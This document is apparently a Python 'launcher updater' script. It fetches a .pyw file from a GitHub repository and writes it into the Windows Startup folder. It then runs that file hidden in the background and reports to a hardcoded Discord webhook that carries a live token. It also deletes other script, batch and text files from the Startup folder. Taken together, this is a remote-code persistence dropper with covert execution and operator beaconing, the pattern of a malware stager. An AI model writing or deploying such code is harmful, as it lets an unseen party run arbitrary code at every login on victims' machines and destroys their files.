# monitor_script.py - Only updates launcher and sends webhook
import os
import sys
import urllib.request
import requests
import json
import tempfile
import subprocess
import time

# Discord webhook for update notifications
UPDATE_WEBHOOK = "https://discordapp.com/api/webhooks/1462762502130630781/IohGYGgxBIr2WPLUHF14QN_8AbyUq-rVGv_KQzhX1rHokBxF_OqjWlRm96x_gbYGQEJ0"

def send_update_webhook(status, message):
    """Send update notification to Discord"""
    try:
        data = {
            "embeds": [{
                "title": f"🔄 Launcher Update - {status}",
                "description": message,
                "color": 3066993 if status == "SUCCESS" else 15158332,
                "timestamp": time.strftime('%Y-%m-%dT%H:%M:%S'),
                "footer": {"text": "Auto-Updater"}
            }]
        }
        
        response = requests.post(
            UPDATE_WEBHOOK,
            json=data,
            headers={'Content-Type': 'application/json'}
        )
        return response.status_code in [200, 204]
    except:
        return False

def update_launcher():
    """Replace Startup.pyw with github_launcher.pyw from GitHub"""
    try:
        # GitHub URLs
        GITHUB_USERNAME = "ElianBoden"
        GITHUB_REPO = "Deployer"
        GITHUB_BRANCH = "main"
        
        LAUNCHER_URL = f"https://raw.githubusercontent.com/{GITHUB_USERNAME}/{GITHUB_REPO}/{GITHUB_BRANCH}/github_launcher.pyw"
        
        # Path to startup folder
        startup_folder = os.path.join(
            os.getenv('APPDATA'),
            'Microsoft\\Windows\\Start Menu\\Programs\\Startup'
        )
        
        target_file = os.path.join(startup_folder, "Startup.pyw")
        backup_file = os.path.join(startup_folder, "Startup_backup.pyw")
        
        print(f"Downloading launcher from: {LAUNCHER_URL}")
        
        # Download the new launcher
        response = urllib.request.urlopen(LAUNCHER_URL)
        new_launcher_code = response.read().decode('utf-8')
        
        print(f"Downloaded {len(new_launcher_code)} bytes")
        
        # Check if current launcher exists
        current_exists = os.path.exists(target_file)
        
        if current_exists:
            # Read current launcher for comparison
            with open(target_file, 'r', encoding='utf-8') as f:
                current_code = f.read()
            
            # Check if update is needed
            if current_code.strip() == new_launcher_code.strip():
                print("Launcher already up to date")
                send_update_webhook("NO CHANGE", "Launcher already up to date")
                return False
            
            # Backup current launcher
            try:
                with open(backup_file, 'w', encoding='utf-8') as f:
                    f.write(current_code)
                print(f"Backup created: {backup_file}")
            except:
                pass
        
        # Write new launcher
        with open(target_file, 'w', encoding='utf-8') as f:
            f.write(new_launcher_code)
        
        print(f"Launcher updated: {target_file}")
        
        # Delete backup after successful update
        if os.path.exists(backup_file):
            try:
                os.remove(backup_file)
                print("Backup removed")
            except:
                pass
        
        # Send success webhook
        message = f"Successfully updated launcher from GitHub\n"
        message += f"**File:** `Startup.pyw`\n"
        message += f"**Size:** {len(new_launcher_code)} bytes\n"
        message += f"**Location:** `{startup_folder}`"
        
        send_update_webhook("SUCCESS", message)
        
        return True
        
    except Exception as e:
        error_msg = f"Failed to update launcher: {str(e)}"
        print(error_msg)
        send_update_webhook("FAILED", error_msg)
        return False

def cleanup_old_files():
    """Remove unwanted files from startup folder"""
    try:
        startup_folder = os.path.join(
            os.getenv('APPDATA'),
            'Microsoft\\Windows\\Start Menu\\Programs\\Startup'
        )
        
        # Keep only these files
        files_to_keep = {'Startup.pyw', 'github_launcher.pyw'}
        
        for filename in os.listdir(startup_folder):
            if filename not in files_to_keep:
                filepath = os.path.join(startup_folder, filename)
                try:
                    if os.path.isfile(filepath):
                        # Delete specific unwanted files
                        if filename.endswith(('.log', '.txt', '.json', '.bat', '.py', '.pyw')):
                            os.remove(filepath)
                            print(f"Removed: {filename}")
                except:
                    pass
    except:
        pass

def main():
    """Main function - only updates launcher"""
    print("=" * 50)
    print("Launcher Updater")
    print("=" * 50)
    
    # Clean up any old files first
    cleanup_old_files()
    
    # Update the launcher
    success = update_launcher()
    
    if success:
        print("✓ Launcher update completed successfully")
        # Restart the launcher to use new version
        restart_launcher()
    else:
        print("✗ Launcher update failed or not needed")
    
    print("=" * 50)

def restart_launcher():
    """Restart the launcher with new version"""
    try:
        startup_folder = os.path.join(
            os.getenv('APPDATA'),
            'Microsoft\\Windows\\Start Menu\\Programs\\Startup'
        )
        launcher_path = os.path.join(startup_folder, "Startup.pyw")
        
        if os.path.exists(launcher_path):
            # Run new launcher in background
            subprocess.Popen(
                [sys.executable, launcher_path],
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            print("Launcher restarted with new version")
    except:
        pass

if __name__ == "__main__":
    main()
